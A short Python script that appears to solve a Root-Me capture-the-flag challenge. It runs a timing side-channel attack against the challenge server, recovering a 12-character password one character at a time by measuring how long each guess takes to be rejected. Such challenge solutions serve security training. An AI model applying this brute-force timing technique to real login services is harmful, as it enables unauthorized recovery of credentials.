


import socket
from time import time
from string import printable

HOST = 'challenge01.root-me.org'
PORT = 51015

HIGH_TIME = 500
BASE_TIME = 100
password = ''

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	
	s.connect((HOST, PORT))

	s.recv(1024).decode() # Ask password

	while len(password) != 12:

		for char in printable:	
						    			   
			    start = time()
			    s.send((password+char).encode()) # send password	   
			    answer  = s.recv(1024).decode() # Receive check
			    dt = 1000*(time()-start)

			    if 'Wrong' in answer:
			    	print('Trying {} | Elapsed time [ms]: {}'.format(char, dt))
			    elif 'Bye' in answer:
			    	print('Connection was close on {} with password {}'.format(char, password))
			    else:
			    	print(answer)

			    if dt > (len(password)+1)*HIGH_TIME+BASE_TIME:
			    	print('Adding ', char)
			    	password += char	
			    	break    				    			   

		print('Current guess: ', password)